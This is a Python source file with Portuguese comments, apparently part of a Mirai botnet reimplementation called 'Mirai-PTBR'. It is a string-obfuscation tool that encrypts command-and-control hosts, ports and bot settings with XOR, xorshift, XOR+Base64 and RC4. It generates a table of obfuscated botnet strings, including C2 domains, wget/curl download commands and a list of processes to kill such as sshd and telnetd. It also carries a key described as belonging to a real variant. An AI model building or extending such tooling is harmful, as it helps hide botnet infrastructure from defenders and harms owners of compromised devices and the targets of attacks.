#!/usr/bin/env python3
"""
tools/enc.py — Ferramenta de Ofuscação para Mirai-PTBR

Inspirado no enc.c original do Mirai (jgamblin/Mirai-Source-Code).
Ofusca strings sensíveis (CNC_HOST, CNC_PORT, chaves, etc.) usando
múltiplos métodos:

  1. XOR (compatível com Mirai original) — chave 32-bit derivada do byte
  2. XOR-rotativo — chave rotativa estilo xorshift
  3. XOR + Base64 — duas camadas de ofuscação
  4. RC4 — stream cipher (usado por variantes modernas do Mirai)

Uso:
    python tools/enc.py string "meu.cnc.com"           # XOR simples
    python tools/enc.py port 48101                      # Ofusca porta
    python tools/enc.py --method xor-b64 string "..."   # Dupla camada
    python tools/enc.py --method rc4 string "..."       # RC4
    python tools/enc.py --key 0xDEADBEEF string "..."   # Chave customizada
    python tools/enc.py --generate-key                  # Gera chave aleatória
    python tools/enc.py --generate-table                # Gera table.py completo
    python tools/enc.py --decrypt <hex> --key <key>     # Decofusca
"""

import os
import sys
import argparse
import random
import base64
import hashlib
import struct
from typing import Optional, Tuple, List

# ─── Chaves Padrão ─────────────────────────────────────────────────────────
DEFAULT_XOR_KEY = 0xDEADBEEF  # Mesma usada no bot
DEFAULT_RC4_KEY = bytes.fromhex("6e7976666525a97639777d2d7f303177")  # Variante real


# ─── XOR (Compatível com Mirai original) ────────────────────────────────────
def xor_encrypt(data: bytes, key: int = DEFAULT_XOR_KEY) -> bytes:
    """
    Ofuscação XOR estilo Mirai original.
    A chave 32-bit (ex: 0xDEADBEEF) é aplicada byte a byte:
      output[i] = data[i] ^ key_byte  (key_byte rotaciona pelos 4 bytes da chave)

    No Mirai original: key é uint32_t, aplicada como (key >> (i % 4 * 8)) & 0xFF
    """
    result = bytearray()
    for i, b in enumerate(data):
        key_byte = (key >> ((i % 4) * 8)) & 0xFF
        result.append(b ^ key_byte)
    return bytes(result)


def xor_decrypt(data: bytes, key: int = DEFAULT_XOR_KEY) -> bytes:
    """XOR é simétrico — mesma operação."""
    return xor_encrypt(data, key)


# ─── XOR Rotativo (Xorshift-style) ──────────────────────────────────────────
def xor_rot_encrypt(data: bytes, seed: int = None) -> Tuple[bytes, int]:
    """
    XOR com chave rotativa estilo xorshift128.
    A cada byte, a chave é rotacionada/transformada.
    """
    if seed is None:
        seed = random.randint(0, 0xFFFFFFFF)

    key = seed
    result = bytearray()

    for b in data:
        # Rotaciona key estilo xorshift
        key ^= (key << 13) & 0xFFFFFFFF
        key ^= (key >> 17) & 0xFFFFFFFF
        key ^= (key << 5) & 0xFFFFFFFF

        key_byte = key & 0xFF
        result.append(b ^ key_byte)

    return bytes(result), seed


def xor_rot_decrypt(data: bytes, seed: int) -> bytes:
    """Decofusca XOR rotativo (simétrico com mesma seed)."""
    return xor_rot_encrypt(data, seed)[0]


# ─── XOR + Base64 (Dupla camada) ────────────────────────────────────────────
def xor_b64_encrypt(data: bytes, key: int = DEFAULT_XOR_KEY) -> str:
    """
    Ofusca com XOR, depois codifica em Base64.
    """
    xored = xor_encrypt(data, key)
    return base64.b64encode(xored).decode('ascii')


def xor_b64_decrypt(data: str, key: int = DEFAULT_XOR_KEY) -> bytes:
    """
    Decodifica Base64, depois de-XOR.
    """
    try:
        decoded = base64.b64decode(data)
    except Exception:
        # Tenta como hex
        decoded = bytes.fromhex(data)
    return xor_decrypt(decoded, key)


# ─── RC4 ────────────────────────────────────────────────────────────────────
def rc4_encrypt(data: bytes, key: bytes = DEFAULT_RC4_KEY) -> bytes:
    """
    RC4 stream cipher — usado por variantes modernas do Mirai.
    Implementação didática sem dependências externas.
    """
    # KSA (Key Scheduling Algorithm)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]

    # PRGA (Pseudo-Random Generation Algorithm)
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) & 0xFF]
        result.append(byte ^ k)

    return bytes(result)


rc4_decrypt = rc4_encrypt  # Simétrico


# ─── Utilitários ────────────────────────────────────────────────────────────
def bytes_to_hex_str(data: bytes) -> str:
    """Converte bytes para string hex estilo Mirai (ex: \\xDE\\xAD\\xBE\\xEF)."""
    return ''.join(f'\\x{b:02x}' for b in data)


def bytes_to_c_array(data: bytes, var_name: str = "data") -> str:
    """Gera array C-style para copiar."""
    hex_bytes = ', '.join(f'0x{b:02x}' for b in data)
    return f"uint8_t {var_name}[] = {{ {hex_bytes} }};"


def generate_random_key() -> int:
    """Gera chave XOR 32-bit aleatória."""
    return random.randint(0, 0xFFFFFFFF)


def generate_rc4_key(length: int = 16) -> bytes:
    """Gera chave RC4 aleatória."""
    return os.urandom(length)


def format_output(label: str, hex_str: str, b64_str: str = None,
                  c_array: str = None, python_bytes: str = None,
                  length: int = None, key_info: str = None) -> str:
    """Formata saída padronizada."""
    lines = [
        f"{'='*60}",
        f"  {label}",
        f"{'='*60}",
    ]
    if key_info:
        lines.append(f"  Chave:     {key_info}")
    if length is not None:
        lines.append(f"  Tamanho:   {length} bytes")
    lines.append(f"  Hex:       {hex_str}")
    if b64_str:
        lines.append(f"  Base64:    {b64_str}")
    if python_bytes:
        lines.append(f"  Python:    {python_bytes}")
    if c_array:
        lines.append(f"  C-array:   {c_array}")
    lines.append(f"{'='*60}")
    return '\n'.join(lines)


# ─── Geração de Tabela (table.py) ──────────────────────────────────────────
def generate_table_module(output_file: str = None) -> str:
    """
    Gera módulo table.py completo com strings ofuscadas.
    Similar ao table.c + table.h do Mirai original.
    """
    import textwrap

    # Gera chave aleatória
    xor_key = generate_random_key()
    rc4_key = os.urandom(16)

    # Strings sensíveis para ofuscar
    sensitive_strings = {
        "CNC_HOST": "127.0.0.1",
        "CNC_PORT": "48101",
        "BOT_ID": "mirai-ptbr",
        "TABLE_CNC_DOMAIN": "cnc.mirai-ptbr.local",
        "TABLE_SCAN_CB_DOMAIN": "scan.mirai-ptbr.local",
        "TABLE_EXEC_SUCCESS": "wget -q -O",
        "TABLE_EXEC_FAIL": "curl -so",
        "TABLE_KILLER_PROC": "telnetd",
        "TABLE_KILLER_PROC2": "sshd",
        "TABLE_KILLER_PROC3": "init",
        "TABLE_KILLER_PROC4": "bash",
        "TABLE_KILLER_PROC5": "sh",
        "TABLE_MIRAI_PROC": "mirai",
        "TABLE_MIRAI_PROC2": "bot",
        "TABLE_MIRAI_PROC3": "loader",
        "TABLE_MIRAI_PROC4": "scan",
        "TABLE_ATK_PATH": "/tmp",
        "TABLE_ATK_UA": "Mozilla/5.0",
        "TABLE_ATK_ACCEPT": "text/html",
        "TABLE_ATK_ACCEPT_LANG": "en-US",
        "TABLE_ATK_CACHE": "no-cache",
        "TABLE_ATK_CONNECTION": "keep-alive",
    }

    # Ofusca cada string
    table_entries = {}
    for name, value in sensitive_strings.items():
        value_bytes = value.encode('utf-8')
        xored = xor_encrypt(value_bytes, xor_key)
        # Também faz RC4 para variante
        rc4d = rc4_encrypt(value_bytes, rc4_key)

        table_entries[name] = {
            "plain": value,
            "hex": xored.hex(),
            "hex_rc4": rc4d.hex(),
            "len": len(value_bytes),
        }

    # Gera código Python
    lines = [
        '"""',
        'table.py — Tabela de strings ofuscadas',
        '',
        'Gerado automaticamente por tools/enc.py --generate-table',
        f'Data: {__import__("datetime").datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
        '',
        'Uso:',
        '    from tools.enc import xor_decrypt',
        '    cnc_host = xor_decrypt(bytes.fromhex(TABLE["CNC_HOST"]["hex"]), XOR_KEY)',
        '"""',
        '',
        f'XOR_KEY = 0x{xor_key:08X}  # Chave XOR 32-bit',
        f'RC4_KEY = {rc4_key.hex()}  # Chave RC4 (hex)',
        '',
        'TABLE = {',
    ]

    for name, entry in table_entries.items():
        lines.append(f'    # {entry["plain"]} ({entry["len"]} bytes)')
        lines.append(f'    "{name}": {{')
        lines.append(f'        "len": {entry["len"]},')
        lines.append(f'        "hex": "{entry["hex"]}",')
        lines.append(f'        "hex_rc4": "{entry["hex_rc4"]}",')
        lines.append(f'    }},')
        lines.append('')

    lines.append('}')
    lines.append('')
    lines.append('')
    lines.append('def table_retrieve(name: str, use_rc4: bool = False) -> bytes:')
    lines.append('    """Recupera string ofuscada da tabela e decodifica."""')
    lines.append('    from tools.enc import xor_decrypt, rc4_decrypt')
    lines.append('    entry = TABLE[name]')
    lines.append('    data = bytes.fromhex(entry["hex_rc4" if use_rc4 else "hex"])')
    lines.append('    if use_rc4:')
    lines.append('        return rc4_decrypt(data, bytes.fromhex(RC4_KEY))')
    lines.append('    return xor_decrypt(data, XOR_KEY)')
    lines.append('')

    source = '\n'.join(lines)

    if output_file:
        with open(output_file, 'w') as f:
            f.write(source)
        print(f"Tabela gerada: {output_file} ({len(table_entries)} entradas, XOR_KEY=0x{xor_key:08X})")

    return source


# ─── CLI ────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Mirai-PTBR enc.py — Ofuscação de strings/configurações",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python tools/enc.py string "meu.cnc.com"
  python tools/enc.py port 48101
  python tools/enc.py --method xor-b64 string "senha123"
  python tools/enc.py --method rc4 string "config.ptr"
  python tools/enc.py --key 0xC0FFEE string "admin"
  python tools/enc.py --generate-key
  python tools/enc.py --generate-table
  python tools/enc.py --decrypt "deadbeef" --key 0xDEADBEEF
  python tools/enc.py --decrypt-b64 "7ev97ev5" --key 0xDEADBEEF
        """
    )

    parser.add_argument("type", nargs="?", choices=["string", "port", "int"],
                        help="Tipo do dado (string, port ou int)")
    parser.add_argument("value", nargs="?", help="Valor a ofuscar")

    parser.add_argument("--method", "-m", choices=["xor", "xor-rot", "xor-b64", "rc4"],
                        default="xor", help="Método de ofuscação (default: xor)")
    parser.add_argument("--key", "-k", type=lambda x: int(x, 0) if x.startswith(('0x', '0X')) else int(x),
                        help="Chave XOR (hex: 0xDEADBEEF ou decimal)")
    parser.add_argument("--rc4-key", help="Chave RC4 em hex")
    parser.add_argument("--seed", type=int, help="Seed para xor-rot")
    parser.add_argument("--generate-key", "-g", action="store_true",
                        help="Gerar chave XOR aleatória e sair")
    parser.add_argument("--generate-table", "-t", action="store_true",
                        help="Gerar table.py completo e sair")
    parser.add_argument("--output", "-o", help="Arquivo de saída para --generate-table")
    parser.add_argument("--decrypt", "-d", help="Decofuscar string hex")
    parser.add_argument("--decrypt-b64", help="Decofuscar string base64")
    parser.add_argument("--c-array", action="store_true",
                        help="Mostrar também como C array")
    parser.add_argument("--python-bytes", action="store_true",
                        help="Mostrar também como bytes Python")

    args = parser.parse_args()

    # ─── Ações especiais ────────────────────────────────────────────────
    if args.generate_key:
        key = generate_random_key()
        print(f"XOR_KEY = 0x{key:08X} ({key})")
        return

    if args.generate_table:
        generate_table_module(args.output)
        return

    # ─── Decrypt ────────────────────────────────────────────────────────
    if args.decrypt or args.decrypt_b64:
        if args.decrypt:
            data = bytes.fromhex(args.decrypt)
            label = f"Decofuscando hex: {args.decrypt}"
        else:
            data = args.decrypt_b64
            label = f"Decofuscando base64: {args.decrypt_b64}"

        key = args.key if args.key is not None else DEFAULT_XOR_KEY

        if args.method == "xor":
            result = xor_decrypt(data, key) if args.decrypt else xor_b64_decrypt(data, key)
        elif args.method == "xor-rot":
            seed = args.seed or DEFAULT_XOR_KEY
            result = xor_rot_decrypt(data, seed)
        elif args.method == "rc4":
            rc4_key = bytes.fromhex(args.rc4_key) if args.rc4_key else DEFAULT_RC4_KEY
            result = rc4_decrypt(data, rc4_key)
        else:
            result = xor_b64_decrypt(data, key)

        try:
            plain = result.decode('utf-8')
        except UnicodeDecodeError:
            plain = repr(result)

        print(format_output(
            label,
            hex_str=result.hex(),
            key_info=f"0x{key:08X}" if args.method in ("xor", "xor-b64") else
                     (args.rc4_key or DEFAULT_RC4_KEY.hex()),
            length=len(result),
        ))
        print(f"  Resultado: {plain}")
        return

    # ─── Encrypt ────────────────────────────────────────────────────────
    if not args.type or not args.value:
        parser.print_help()
        sys.exit(1)

    # Prepara dados
    if args.type == "string":
        data = args.value.encode('utf-8')
        label = f"String: \"{args.value}\""
    elif args.type == "port":
        data = struct.pack(">H", int(args.value))  # Network byte order (big endian)
        label = f"Porta: {args.value}"
    elif args.type == "int":
        data = struct.pack(">I", int(args.value))
        label = f"Inteiro: {args.value}"

    # Define chave
    key = args.key if args.key is not None else DEFAULT_XOR_KEY
    seed = args.seed or DEFAULT_XOR_KEY

    # Ofusca
    if args.method == "xor":
        result = xor_encrypt(data, key)
        b64_result = base64.b64encode(result).decode('ascii')
        key_info = f"0x{key:08X}"
        method_name = "XOR (Mirai-compatível)"

    elif args.method == "xor-rot":
        result, used_seed = xor_rot_encrypt(data, seed)
        b64_result = base64.b64encode(result).decode('ascii')
        key_info = f"seed={used_seed}"
        method_name = "XOR Rotativo (xorshift)"

    elif args.method == "xor-b64":
        result_str = xor_b64_encrypt(data, key)
        result = base64.b64decode(result_str)
        b64_result = result_str
        key_info = f"0x{key:08X}"
        method_name = "XOR + Base64"

    elif args.method == "rc4":
        rc4_key = bytes.fromhex(args.rc4_key) if args.rc4_key else DEFAULT_RC4_KEY
        result = rc4_encrypt(data, rc4_key)
        b64_result = base64.b64encode(result).decode('ascii')
        key_info = rc4_key.hex()
        method_name = "RC4"

    # Formata saída
    c_array = bytes_to_c_array(result, "enc_data") if args.c_array else None
    python_bytes = f"bytes.fromhex('{result.hex()}')" if args.python_bytes else None

    print(format_output(
        f"Método: {method_name} | {label}",
        hex_str=result.hex(),
        b64_str=b64_result,
        c_array=c_array,
        python_bytes=python_bytes,
        length=len(data),
        key_info=key_info,
    ))

    # Mostra também o dado decofuscado (verificação)
    if args.method == "xor":
        check = xor_decrypt(result, key)
    elif args.method == "xor-rot":
        check = xor_rot_decrypt(result, seed)
    elif args.method == "xor-b64":
        check = xor_b64_decrypt(b64_result, key)
    elif args.method == "rc4":
        check = rc4_decrypt(result, rc4_key)

    try:
        check_str = check.decode('utf-8')
    except UnicodeDecodeError:
        check_str = repr(check)

    print(f"  Verificação: {check_str}")
    print()


if __name__ == "__main__":
    main()
